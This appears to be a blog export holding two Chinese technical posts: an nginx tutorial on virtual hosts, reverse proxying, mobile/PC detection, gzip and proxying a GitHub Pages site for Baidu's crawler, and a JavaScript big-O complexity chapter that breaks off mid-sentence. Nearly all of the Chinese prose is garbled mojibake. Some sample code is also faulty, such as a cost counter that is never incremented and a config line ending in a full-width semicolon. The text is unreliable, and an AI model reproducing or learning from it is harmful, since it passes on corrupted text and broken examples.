index.htmlé‡Œé¢çš„å†…å®¹ 123&lt;html&gt; &lt;h1&gt;Welcome to port 8001&lt;/h1&gt;&lt;/html&gt; ç„¶åŽé‡å¯ä¸€ä¸‹ nginxæœåŠ¡å™¨ 1nginx -s reload æŽ¥ç€åœ¨æµè§ˆå™¨æ‰“å¼€ï¼Œä½ çš„ipåœ°å€åŽé¢åŠ ä¸Šç«¯å£å· :8001ï¼Œå°±å¯ä»¥è®¿é—®åˆ°ä¸€ä¸‹çš„ç”»é¢äº†ã€‚ åŸºäºŽIPé…ç½®è™šæ‹Ÿä¸»æœºåŸºäºŽipå’ŒåŸºäºŽç«¯å£çš„é…ç½®å‡ ä¹Žæ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æŠŠ server_nameé€‰é¡¹ï¼Œé…ç½®æˆIPå°±å¯ä»¥äº†ã€‚ æŒ‰ç…§ä¸Šé¢çš„é…ç½®å¯ä»¥ä¿®æ”¹ä¸ºï¼š 123456server&#123; listen 8001; # ç›‘å¬çš„ç«¯å£å· server_name 147.124.12.32; root /usr/share/nginx/html/html8001; # æ–‡ä»¶è·¯å¾„ index index.html;&#125; ç”±äºŽæˆ‘è¿™ä¸ªæœåŠ¡å™¨ä¹Ÿæ²¡æœ‰å¤šä¸ªip,æ‰€ä»¥ä¹Ÿæ— æ³•è¿›è¡Œå®žè·µã€‚ ä½¿ç”¨åŸŸåè®¾ç½®è™šæ‹Ÿä¸»æœºè¿™ä¸ªä¸»è¦åœ¨äºŽåŸŸåè§£æžè¿™å—ï¼Œé¦–å…ˆä½ éœ€è¦è´­ä¹°ä¸€ä¸ªåŸŸåï¼ŒæŽ¥ç€åœ¨è´­ä¹°å¤„çš„åŽå°ç®¡ç†è®¾ç½®åŸŸåè§£æžï¼Œè§£æžåˆ°ä½ çš„æœåŠ¡å™¨ipè·Ÿipåœ°å€8001ç«¯å£çš„ä½ç½®ã€‚ æŽ¥ç€æˆ‘ä»¬ä¿®æ”¹ä¹‹å‰çš„ä¸¤ä¸ªæ–‡ä»¶ï¼Œ defalut.conf 1234server&#123; listen 80; # ç›‘å¬çš„ç«¯å£å· server_name åŸŸå1; &#125; 8001.conf 123456server&#123; listen 8001; # ç›‘å¬çš„ç«¯å£å· server_name åŸŸå2; root /usr/share/nginx/html/html8001; # æ–‡ä»¶è·¯å¾„ index index.html;&#125; é…ç½®å¥½äº†ä¹‹åŽï¼Œå°±è¿›è¡Œé‡å¯ï¼Œç„¶åŽåœ¨æµè§ˆå™¨è¾“å…¥ä½ çš„ä¸¤ä¸ªåŸŸåï¼Œå°±å¯ä»¥è®¿é—®è¿™ä¸¤ä¸ªç½‘é¡µäº†ã€‚ Nginxåå‘ä»£ç†çš„è®¾ç½®webæ¨¡å¼åŸºæœ¬çš„éƒ½æ˜¯æ ‡å‡†çš„CSç»“æž„ï¼Œå³Clientç«¯åˆ°Serverç«¯ã€‚ä»£ç†å°±æ˜¯åœ¨Clientç«¯å’ŒServerç«¯ä¹‹é—´å¢žåŠ ä¸€ä¸ªæä¾›ç‰¹å®šåŠŸèƒ½çš„æœåŠ¡å™¨ï¼Œè¿™ä¸ªæœåŠ¡å™¨å°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ä»£ç†æœåŠ¡å™¨ã€‚ è¿™é‡Œæˆ‘ç™¾åº¦äº†å…·ä½“çš„æ¦‚å¿µï¼Œä»¥ä¸‹çš„å†…å®¹å¯ä»¥å‚è€ƒä¸‹ æ­£å‘ä»£ç†ä¸Žåå‘ä»£ç† å€Ÿé‰´ä¸Šé¢åŽŸæ–‡çš„è¯å°±æ˜¯ï¼š æ€»ç»“æ¥è¯´ï¼Œæ­£å‘ä»£ç† æ˜¯ä¸€ä¸ªä½äºŽå®¢æˆ·ç«¯å’ŒåŽŸå§‹æœåŠ¡å™¨(origin server)ä¹‹é—´çš„æœåŠ¡å™¨ï¼Œä¸ºäº†ä»ŽåŽŸå§‹æœåŠ¡å™¨å–å¾—å†…å®¹ï¼Œå®¢æˆ·ç«¯å‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚å¹¶æŒ‡å®šç›®æ ‡(åŽŸå§‹æœåŠ¡å™¨)ï¼Œç„¶åŽä»£ç†å‘åŽŸå§‹æœåŠ¡å™¨è½¬äº¤è¯·æ±‚å¹¶å°†èŽ·å¾—çš„å†…å®¹è¿”å›žç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å¿…é¡»è¦è¿›è¡Œä¸€äº›ç‰¹åˆ«çš„è®¾ç½®æ‰èƒ½ä½¿ç”¨æ­£å‘ä»£ç†ã€‚ æ­£å‘ä»£ç†çš„ç”¨é€”ï¼š è®¿é—®åŽŸæ¥æ— æ³•è®¿é—®çš„èµ„æºï¼Œå¦‚google å¯ä»¥åšç¼“å­˜ï¼ŒåŠ é€Ÿè®¿é—®èµ„æº å¯¹å®¢æˆ·ç«¯è®¿é—®æŽˆæƒï¼Œä¸Šç½‘è¿›è¡Œè®¤è¯ ä»£ç†å¯ä»¥è®°å½•ç”¨æˆ·è®¿é—®è®°å½•ï¼ˆä¸Šç½‘è¡Œä¸ºç®¡ç†ï¼‰ï¼Œå¯¹å¤–éšè—ç”¨æˆ·ä¿¡æ¯ åå‘ä»£ç†ï¼ˆReverse Proxyï¼‰å®žé™…è¿è¡Œæ–¹å¼æ˜¯æŒ‡ä»¥ä»£ç†æœåŠ¡å™¨æ¥æŽ¥å—internetä¸Šçš„è¿žæŽ¥è¯·æ±‚ï¼Œç„¶åŽå°†è¯·æ±‚è½¬å‘ç»™å†…éƒ¨ç½‘ç»œä¸Šçš„æœåŠ¡å™¨ï¼Œå¹¶å°†ä»ŽæœåŠ¡å™¨ä¸Šå¾—åˆ°çš„ç»“æžœè¿”å›žç»™internetä¸Šè¯·æ±‚è¿žæŽ¥çš„å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶ä»£ç†æœåŠ¡å™¨å¯¹å¤–å°±è¡¨çŽ°ä¸ºä¸€ä¸ªæœåŠ¡å™¨ã€‚ åå‘ä»£ç†çš„ä½œç”¨ï¼š ä¿è¯å†…ç½‘çš„å®‰å…¨ï¼Œå¯ä»¥ä½¿ç”¨åå‘ä»£ç†æä¾›WAFåŠŸèƒ½ï¼Œé˜»æ­¢webæ”»å‡»å¤§åž‹ç½‘ç«™ï¼Œé€šå¸¸å°†åå‘ä»£ç†ä½œä¸ºå…¬ç½‘è®¿é—®åœ°å€ï¼ŒWebæœåŠ¡å™¨æ˜¯å†…ç½‘ã€‚ è´Ÿè½½å‡è¡¡ï¼Œé€šè¿‡åå‘ä»£ç†æœåŠ¡å™¨æ¥ä¼˜åŒ–ç½‘ç«™çš„è´Ÿè½½ æœ€ç®€å•çš„åå‘ä»£ç†å‡å¦‚æˆ‘ä»¬è¦è®¿é—® åŸŸå1ç„¶åŽåå‘ä»£ç†åˆ° åŸŸå2è¿™ä¸ªç½‘ç«™ã€‚æˆ‘ä»¬ç›´æŽ¥ä¿®æ”¹ defalut.confé…ç½®æ–‡ä»¶ã€‚ 1234567server&#123; listen 80; # ç›‘å¬çš„ç«¯å£å· server_name åŸŸå1; location / &#123; proxy_pass åŸŸå2ï¼› &#125;&#125; ä¸€èˆ¬æˆ‘ä»¬åå‘ä»£ç†çš„éƒ½æ˜¯ä¸€ä¸ªipï¼Œä½†æ˜¯ä»£ç†åŸŸåä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ å…¶ä»–åå‘ä»£ç†æŒ‡ä»¤ proxy_set_header:åœ¨å°†å®¢æˆ·ç«¯è¯·æ±‚å‘é€ç»™åŽç«¯æœåŠ¡å™¨ä¹‹å‰ï¼Œæ›´æ”¹æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚å¤´ä¿¡æ¯ proxy_connect_timeout:é…ç½®Nginx ä¸ŽåŽç«¯ä»£ç†æœåŠ¡å™¨å°è¯•å»ºç«‹è¿žæŽ¥çš„è¶…æ—¶æ—¶é—´ proxy_read_timeout:é…ç½®Nginx å‘åŽç«¯åŠ¡å™¨ç»„å‘å‡ºreadè¯·æ±‚åŽï¼Œç­‰å¾…ç›¸åº”çš„è¶…æ—¶æ—¶é—´ proxy_send_timeout:é…ç½®Nginx å‘åŽç«¯åŠ¡å™¨ç»„å‘å‡ºwriteè¯·æ±‚åŽï¼Œç­‰å¾…ç›¸åº”çš„è¶…æ—¶æ—¶é—´ proxy_redirect:ç”¨äºŽä¿®æ”¹åŽç«¯æœåŠ¡å™¨è¿”å›žçš„å“åº”å¤´ä¸­çš„Locationå’ŒRefresh Nginxé€‚é…PCæˆ–ç§»åŠ¨è®¾å¤‡é€šè¿‡é…ç½®Nginxæ¥è¯†åˆ«ç§»åŠ¨ç«¯å’Œpcç«¯æ¥å±•ç¤ºä¸åŒçš„é¡µé¢ã€‚ $http_user_agentçš„ä½¿ç”¨Nginxé€šè¿‡å†…ç½®å˜é‡ $http_user_agentï¼Œå¯ä»¥èŽ·å–åˆ°è¯·æ±‚å®¢æˆ·ç«¯çš„ userAgent ï¼Œå°±å¯ä»¥åˆ¤æ–­ç”¨æˆ·ç›®å‰å¤„äºŽç§»åŠ¨ç«¯è¿˜æ˜¯pcç«¯ï¼Œè¿›è€Œå±•ç¤ºä¸åŒçš„é¡µé¢ç»™ç”¨æˆ·ã€‚ é¦–å…ˆï¼Œå…ˆåœ¨ /usr/share/nginxç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œåˆ†åˆ«æ˜¯pcå’Œmobileç›®å½• 123cd /usr/share/nginxmkdir pcmkdir mobile æŽ¥ç€åˆ†åˆ«åœ¨ä¸¤ä¸ªç›®å½•æ–‡ä»¶å¤¹ä¸‹é¢å»ºç«‹ index.html mobile/index.html 123&lt;html&gt; &lt;h1&gt;I am mobile&lt;/h1&gt;&lt;/html&gt; pc/index.html 123&lt;html&gt; &lt;h1&gt;I am pc&lt;/h1&gt;&lt;/html&gt; å›žåˆ° etc/nginx/conf.dæ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ default.conf,ä¿®æ”¹ 8001.confæ–‡ä»¶ 1234567891011server&#123; listen 8001; server_name localhost; location / &#123; root /usr/share/nginx/pc; if ($http_user_agent ~* '(Android|webOS|iPhone|iPod|BlackBerry)') &#123; root /usr/share/nginx/mobile; &#125; index index.html; &#125;&#125; è¿™é‡Œè¦æ³¨æ„ if ä¸ŽåŽé¢çš„æ‹¬å·è¦æœ‰è‡³å°‘ä¸€ä¸ªç©ºæ ¼çš„è·ç¦»ï¼Œå¦‚æžœç´§è´´çš„è¯ä¼šæŠ¥é”™ã€‚ æŽ¥ç€é‡å¯æœåŠ¡å™¨ 1nginx -s reload æŽ¥ç€åœ¨æµè§ˆå™¨æ‰“å¼€ipåœ°å€çš„8001ç«¯å£ï¼Œå¯ä»¥çœ‹åˆ° æŽ¥ç€ f12ï¼Œåˆ‡æ¢ç§»åŠ¨ç«¯æ¨¡å¼ï¼Œè¿›è¡Œåˆ·æ–°ï¼Œå¯ä»¥çœ‹åˆ° ä¸Šé¢çš„é€‚é…æ˜¯æ²¡æœ‰å†™å®Œæ•´çš„ï¼Œå…·ä½“çš„å¯ä»¥ç‚¹å‡»è¿™é‡Œï¼Œé‡Œé¢ä¼šæœ‰ä¸åŒæœåŠ¡å™¨å®Œæ•´çš„åˆ¤æ–­ç«¯ã€‚ Nginxçš„GzipåŽ‹ç¼©é…ç½®Gzipæ˜¯ç½‘é¡µçš„ä¸€ç§ç½‘é¡µåŽ‹ç¼©æŠ€æœ¯ï¼Œç»è¿‡gzipåŽ‹ç¼©åŽï¼Œé¡µé¢å¤§å°å¯ä»¥å˜ä¸ºåŽŸæ¥çš„30%ç”šè‡³æ›´å°ã€‚æ›´å°çš„ç½‘é¡µä¼šè®©ç”¨æˆ·æµè§ˆçš„ä½“éªŒæ›´å¥½ï¼Œé€Ÿåº¦æ›´å¿«ã€‚gzipç½‘é¡µåŽ‹ç¼©çš„å®žçŽ°éœ€è¦æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„æ”¯æŒã€‚ å½“æµè§ˆå™¨æ”¯æŒgzipåŽ‹ç¼©æ—¶ï¼Œä¼šåœ¨è¯·æ±‚æ¶ˆæ¯ä¸­åŒ…å« Accept-Encoding:gzipï¼Œè¿™æ ·Nginxå°±ä¼šå‘æµè§ˆå™¨å‘é€ç»è¿‡gzipåŽ‹ç¼©çš„å†…å®¹ï¼ŒåŒæ—¶åœ¨ç›¸åº”çš„ä¿¡æ¯å¤´åŠ å…¥ Content-Encoding:gzip,å£°æ˜Žè¿™æ˜¯gzipåŽçš„å†…å®¹ï¼Œæµè§ˆå™¨éœ€è¦å…ˆè§£åŽ‹æ‰å¯ä»¥è§£æžè§£å‡ºã€‚ gzipç½‘ç«™åŽ‹ç¼©æ£€æµ‹ å¯ä»¥é¦–å…ˆæ£€æµ‹æˆ‘çš„æœåŠ¡å™¨ip å¯ä»¥çœ‹åˆ°æ˜¯æ²¡æœ‰å¼€å¯gzipçš„ã€‚ gzipçš„é…ç½®é¡¹Nginx æä¾›äº†ä¸“é—¨çš„gzipæ¨¡å—ã€‚ gzip:è¯¥æŒ‡ä»¤ç”¨äºŽå¼€å¯æˆ–è€…å…³é—­gzipæŒ‡ä»¤ gzip_static:Nginxå¯¹äºŽé™æ€æ–‡ä»¶çš„å¤„ç†æ¨¡å—,è¯¥æ¨¡å—å¯ä»¥è¯»å–é¢„å…ˆåŽ‹ç¼©çš„gzæ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥å‡å°‘æ¯æ¬¡è¯·æ±‚è¿›è¡ŒgzipåŽ‹ç¼©çš„CPUèµ„æºæ¶ˆè€—,on|off gzip_buffers:è®¾ç½®ç³»ç»ŸèŽ·å–å‡ ä¸ªå•ä½çš„ç¼“å­˜ç”¨äºŽå­˜å‚¨gzipçš„åŽ‹ç¼©ç»“æžœæ•°æ®æµ gzip_comp_level:gzipåŽ‹ç¼©æ¯”ï¼ŒåŽ‹ç¼©çº§åˆ«æ˜¯1-9,1çš„çº§åˆ«æœ€ä½Žï¼Œ9çš„åŽ‹ç¼©çº§åˆ«æœ€é«˜ã€‚åŽ‹ç¼©æ—¶é—´ä¹Ÿéšç€å¢žé•¿ gzip_disable:å¯ä»¥é€šè¿‡è¯¥æŒ‡ä»¤å¯¹ä¸€äº›ç‰¹å®šçš„ User-Agentä¸ä½¿ç”¨åŽ‹ç¼©åŠŸèƒ½ã€‚ gzip_min_length:è®¾ç½®è¿è¡ŒåŽ‹ç¼©çš„é¡µé¢æœ€å°å­—æ•°ï¼Œé¡µé¢å­—èŠ‚æ•°ä»Žç›¸åº”æ¶ˆæ¯å¤´ Content-length ä¸­è¿›è¡ŒèŽ·å– gzip_http_version:è¯†åˆ«HTTPåè®®ç‰ˆæœ¬ï¼Œ1.1æˆ–1.0 gzip_proxied:ç”¨äºŽè®¾ç½®å¯åŠ¨æˆ–ç¦ç”¨ä»Žä»£ç†æœåŠ¡å™¨ä¸Šæ”¶åˆ°ç›¸åº”å†…å®¹gzipåŽ‹ç¼© gzip_vary:ç”¨äºŽåœ¨å“åº”æ¶ˆæ¯å¤´ä¸­æ·»åŠ  Vary:Accept-Encodingï¼Œæ˜¯ä»£ç†æœåŠ¡å™¨æ ¹æ®è¯·æ±‚å¤´ä¸­çš„ Accept-Encoding è¯†åˆ«æ˜¯å¦å¯åŠ¨ gzipåŽ‹ç¼©ã€‚ gzipç®€å•é…ç½®etc/nginx/nginx.conf 123456http &#123; ..... gzip on; gzip_types text/plain application/javascript text/css; .....&#125; ä¸Šé¢æ˜¯æ£€æµ‹å·¥å…·çš„ç»“æžœï¼Œæ‰“å¼€ç½‘ç«™æŒ‰ F12, æŸ¥çœ‹ç½‘ç«™èµ„æºã€‚ å¯ä»¥æ¸…æ¥šçš„çœ‹è§Content-Encodingä¸ºgzipç±»åž‹ã€‚æˆ‘ä»¬å°±æˆåŠŸçš„å¼€å¯äº†gzipã€‚ è¿™ä¸ªåŽ‹ç¼©çš„é…ç½®éœ€è¦è‡ªå·±æ‘¸ç´¢ï¼Œæ‰å¯ä»¥çŸ¥é“æœ€ä½³çš„åŽ‹ç¼©åº¦ã€‚å¦å¤–ä¹Ÿå¹¶ä¸æ˜¯ä»€ä¹ˆä¸œè¥¿éƒ½éœ€è¦åŽ‹ç¼©å¯ä»¥å¾—åˆ°æ›´å°çš„æ–‡ä»¶ã€‚æœ‰äº›æœ¬æ¥å°±å¾ˆå°çš„æ–‡ä»¶åŽ‹ç¼©åŽåè€Œä¼šå˜å¾—æ¯”åŽŸæ¥çš„å¤§ã€‚å¦å¤–å›¾ç‰‡æ³¨æ„ä¸è¦å¯ç”¨gzipåŽ‹ç¼© åº”ç”¨ä¹‹åå‘ä»£ç†ç™¾åº¦çˆ¬è™«æ”¯æŒ Github Pages æ”¶å½•ç™¾åº¦çˆ¬å– github ç»™ 403 çš„ä¸»è¦ä¾æ®æ˜¯ user agentï¼Œåœ¨ Nginx ä¸­ç›´æŽ¥å¯¹ user agent è¿›è¡Œä¼ªé€  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061server &#123; listen 80; server_name laibh.top; #charset koi8-r; #access_log /var/log/nginx/host.access.log main; # location / &#123; # root /usr/share/nginx/html; # index index.html index.htm; # &#125; location / &#123; proxy_pass http://LbhFront-end.github.io; #æ›¿æ¢æˆè‡ªå·±çš„ github pages ä¸»é¡µ proxy_redirect off; proxy_set_header User-Agent "Mozilla/5.0"; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; location ~* \.(xml|html|htm)$ &#123; proxy_pass http://LbhFront-end.github.io; #æ›¿æ¢æˆè‡ªå·±çš„ github pages ä¸»é¡µ proxy_redirect off; proxy_set_header User-Agent "Mozilla/5.0"; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \.php$ &#123; # proxy_pass http://127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \.php$ &#123; # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #&#125; # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\.ht &#123; # deny all; #&#125;&#125; ç™¾åº¦æŠ“å–è¯Šæ–­è®°å½•ä¸€ç‰‡ç»¿ï¼Œç›´æŽ¥èµ·é£ž]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬åäºŒç« ï¼‰â€”â€” ç®—æ³•å¤æ‚åº¦]]></title>
    <url>%2F2018-11-12-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part12.html</url>
    <content type="text"><![CDATA[èŠ±äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œç»ˆäºŽçœ‹åˆ°è¿™æœ¬ä¹¦çš„æœ€åŽä¸€ç« äº†ã€‚è¿™ç« å°†è¦å­¦ä¹ è‘—åçš„å¤§Oè¡¨ç¤ºæ³•ã€‚ ç¬¬åäºŒç«  ç®—æ³•å¤æ‚åº¦å¤§Oè¡¨ç¤ºæ³•å®ƒç”¨äºŽæè¿°ç®—æ³•çš„æ€§èƒ½å’Œå¤æ‚ç¨‹åº¦ åˆ†æžç®—æ³•æ—¶ï¼Œæ—¶å¸¸é‡åˆ°ä»¥ä¸‹å‡ ç±»å‡½æ•° ç¬¦å· åç§° O(1) å¸¸æ•°çš„ O(log(n)) å¯¹æ•°çš„ O((log(n)c)) å¯¹æ•°å¤šé¡¹å¼çš„ O(n) çº¿æ€§çš„ O(n2) äºŒæ¬¡çš„ O(nc) å¤šé¡¹å¼çš„ O(cn) æŒ‡æ•°çš„ ç†è§£å¤§Oè¡¨ç¤ºæ³•å¦‚ä½•è¡¡é‡ç®—æ³•çš„æ•ˆçŽ‡ï¼Ÿé€šå¸¸æ˜¯ç”¨èµ„æºï¼Œä¾‹å¦‚CPUï¼ˆæ—¶é—´ï¼‰å ç”¨ã€å†…å­˜å ç”¨ã€ç¡¬ç›˜å ç”¨å’Œç½‘ç»œå ç”¨ã€‚å½“è®¨è®ºå¤§Oè¡¨ç¤ºæ³•æ—¶ï¼Œä¸€èˆ¬è€ƒè™‘çš„æ˜¯CPUï¼ˆæ—¶é—´ï¼‰å ç”¨ã€‚ è®©æˆ‘ä»¬è¯•ç€ç”¨ä¸€äº›ä¾‹å­æ¥ç†è§£å¤§Oè¡¨ç¤ºæ³•çš„è§„åˆ™ O(1)123function increment(num)&#123; return ++num;&#125; å‡è®¾è¿è¡Œincrementï¼ˆ1ï¼‰å‡½æ•°ï¼Œæ‰§è¡Œæ—¶é—´ç­‰äºŽ Xã€‚å¦‚æžœå†ç”¨ä¸åŒçš„å‚æ•°è¿è¡Œä¸€æ¬¡incrementå‡½æ•°ï¼Œæ‰§è¡Œäº‹ä»¶ä¾ç„¶æ˜¯ Xã€‚å’Œå‚æ•°æ— å…³ï¼Œincrementå‡½æ•°çš„æ€§èƒ½éƒ½ä¸€æ ·ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¯´ä¸Šè¿°å‡½æ•°çš„å¤æ‚ç¨‹åº¦æ˜¯O(1)ï¼ˆå¸¸æ•°ï¼‰ O(n)12345678function sequentialSearch(array,item)&#123; for(var i = 0; i &lt; array.length; i++)&#123; if(item === array[i])&#123; return i; &#125; &#125; return -1;&#125; å¦‚æžœå°†å«æœ‰10ä¸ªå…ƒç´ çš„æ•°ç»„ï¼ˆ[1,â€¦,10]ï¼‰ä¼ é€’ç»™è¯¥å‡½æ•°ï¼Œä¾‹å¦‚æœç´¢1è¿™ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡åˆ¤æ–­æ—¶å°±èƒ½æ‰¾åˆ°æƒ³è¦æœç´¢çš„å…ƒç´ ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å‡è®¾æ¯æ‰§è¡Œä¸€æ¬¡ï¼ˆitem === array[i]ï¼‰å¼€é”€ä¸º1. çŽ°åœ¨ï¼Œå‡å¦‚è¦æœç´¢å…ƒç´ 11.é‚£ä¹ˆå‡½æ•°ä¼šæ‰§è¡Œ10æ¬¡ï¼ˆéåŽ†æ•°ç»„ä¸­æ‰€æœ‰çš„å€¼ï¼Œå¹¶ä¸”æ‰¾ä¸åˆ°è¦æœç´¢çš„å…ƒç´ ï¼Œå› æ­¤ç»“æžœè¿”å›ž-1ï¼‰ï¼Œé‚£ä¹ˆå¼€é”€å°±æ˜¯10ã€‚ä»¥æ­¤ç±»æŽ¨ï¼ŒsequentialSearch å‡½æ•°æ‰§è¡Œçš„æ€»å¼€é”€å–å†³äº†æ•°ç»„å…ƒç´ çš„ä¸ªæ•°ï¼ˆæ•°ç»„çš„å¤§å°ï¼‰ã€‚å¯ä»¥å¾—åˆ°sequentialSearchå‡½æ•°çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(n)ï¼Œnæ˜¯ï¼ˆè¾“å…¥ï¼‰æ•°ç»„çš„å¤§å°ã€‚ å›žåˆ°ä¹‹å‰çš„ä¾‹å­ï¼Œä¿®æ”¹ä¸€ä¸‹ç®—æ³•çš„å®žçŽ°ã€‚ 12345678910function sequentialSearch(array,item)&#123; var cost = 0; for(var i = 0; i &lt; array.length; i++)&#123; if(item === array[i])&#123; return i; &#125; &#125; console.log('cost for sequentialSearch with inpy size ' + array.length + 'is' + cost); return -1;&#125; ç”¨ä¸åŒå¤§å°è¾“å…¥æ•°ç»„æ‰§è¡Œä»¥ä¸Šç®—æ³•ï¼Œå¯ä»¥çœ‹åˆ°ä¸åŒçš„è¾“å‡ºã€‚ O(n2)ç”¨å†’æ³¡æŽ’åºåšä¾‹å­ 1234567891011121314151617181920function swap(array, index1, index2)&#123; var aux = array[index1]; array[index1] = array[index2]; array[index2] = aux;&#125;function bubbleSort(array)&#123; var length = array.length, cost = 0; for(var i = 0; i &lt; length; i++)&#123; cost++; for(var j = 0; j &lt; length; j++)&#123; cost++; if(array[j] &gt; array[j+1])&#123; swap(array, j, j+1); &#125; &#125; &#125; console.log('cost for bubbleSort with input size' + length + 'is' + cost);&#125; å¦‚æžœç”¨å¤§å°ä¸º10çš„æ•°ç»„æ‰§è¡Œä¸Šé¢çš„å‡½æ•°ï¼Œå¼€é”€æ˜¯100ï¼ˆ102ï¼‰ã€‚ æ—¶é—´å¤æ‚åº¦O(n)çš„ä»£ç åªæœ‰ä¸€å±‚å¾ªçŽ¯ï¼Œè€ŒO(n2)æœ‰ä¸¤å±‚å¾ªçŽ¯ã€‚å¦‚æžœç®—æ³•æœ‰ä¸‰å±‚éåŽ†æ•°ç»„çš„åµŒå¥—å¾ªçŽ¯ï¼Œå®ƒçš„æ—¶é—´å¤æ‚åº¦å¾ˆæœ‰å¯èƒ½æ˜¯O(n3) æ—¶é—´å¤æ‚åº¦æ¯”è¾ƒä¸‹é¢æ¯”è¾ƒäº†å‰è¿°å„ä¸ªå¤§Oç¬¦å·è¡¨ç¤ºçš„æ—¶é—´å¤æ‚åº¦ æ•°æ®ç»“æž„ ä¸‹è¡¨æ˜¯å¸¸ç”¨æ•°æ®ç»“æž„çš„æ—¶é—´å¤æ‚åº¦ æ•°æ®ç»“æž„ ä¸€èˆ¬æƒ…å†µ æœ€å·®æƒ…å†µ æ’å…¥ åˆ é™¤ æœç´¢ æ’å…¥ åˆ é™¤ æœç´¢ æ•°ç»„-æ ˆ-é˜Ÿåˆ— O(1) O(1) O(n) O(1) O(1) O(n) é“¾è¡¨ O(1) O(1) O(n) O(1) O(1) O(n) åŒå‘é“¾è¡¨ O(1) O(1) O(n) O(1) O(1) O(n) æ•£åˆ—è¡¨ O(1) O(1) O(1) O(n) O(n) O(n) äºŒåˆ†æœç´¢æ ‘ O(log(n)) O(log(n)) O(log(n)) O(n) O(n) O(n) AVLæ ‘ O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) å›¾ ä¸‹è¡¨æ˜¯å›¾çš„æ—¶é—´å¤æ‚åº¦ èŠ‚ç‚¹-è¾¹çš„ç®¡ç†æ–¹å¼ å­˜å‚¨ç©ºé—´ å¢žåŠ é¡¶ç‚¹ å¢žåŠ è¾¹ åˆ é™¤é¡¶ç‚¹ åˆ é™¤è¾¹ è½®è¯¢ é‚»æŽ¥è¡¨ O(V+E) O(1) O(1) O(V+E) O(E) O(V) é‚»æŽ¥çŸ©é˜µ O(V2) O(V2) O(1) O(V2) O(1) O(1) æŽ’åºç®—æ³• ä¸‹è¡¨æ˜¯æŽ’åºç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ ç®—æ³•ï¼ˆç”¨äºŽæ•°ç»„ï¼‰ æœ€å¥½æƒ…å†µ ä¸€èˆ¬æƒ…å†µ æœ€å·®æƒ…å†µ å†’æ³¡æŽ’åº O(n) O(n2) O(n2) é€‰æ‹©æŽ’åº O(n2) O(n2) O(n2) æ’å…¥æŽ’åº O(n) O(n2) O(n2) å½’å¹¶æŽ’åº O(nlog(n)) O(nlog(n)) O(nlog(n)) å¿«é€ŸæŽ’åº O(nlog(n)) O(nlog(n)) O(n2) å †æŽ’åº O(nlog(n)) O(nlog(n)) O(nlog(n)) æ¡¶æŽ’åº O(n+k) O(n+k) O(n2) åŸºæ•°æŽ’åº O(nk) O(nk) O(nk) æœç´¢ç®—æ³• ä¸‹è¡¨æ˜¯æœç´¢ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ ç®—æ³• æ•°æ®ç»“æž„ æœ€å·®æƒ…å†µ é¡ºåºæœç´¢ æ•°ç»„ O(n) äºŒåˆ†æœç´¢ å·²æŽ’åºçš„æ•°ç»„ O(log(n)) æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDPSï¼‰ é¡¶ç‚¹æ•°ä¸ºVï¼Œè¾¹æ•°ä¸ºEçš„å›¾ O(V+E) å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰ é¡¶ç‚¹æ•°ä¸ºVï¼Œè¾¹æ•°ä¸ºEçš„å›¾ O(V+E) NPå®Œå…¨ç†è®ºæ¦‚è¿°ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æžœä¸€ä¸ªç®—æ³•çš„å¤æ‚åº¦ä¸º O(nk)ï¼Œå…¶ä¸­kæ˜¯å¸¸æ•°ï¼Œæˆ‘ä»¬å°±è®¤ä¸ºè¿™ä¸ªç®—æ³•æ˜¯æœ€é«˜æ•ˆçš„ï¼Œè¿™å°±æ˜¯å¤šé¡¹å¼ç®—æ³•ã€‚ å¯¹äºŽç»™å®šçš„é—®é¢˜ï¼Œå¦‚æžœå­˜åœ¨å¤šé¡¹å¼ç®—æ³•ï¼Œåˆ™è®¡ä¸ºPï¼ˆpolynomial,å¤šé¡¹å¼ï¼‰ã€‚ è¿˜æœ‰ä¸€ç±»NPï¼ˆnondeterministic 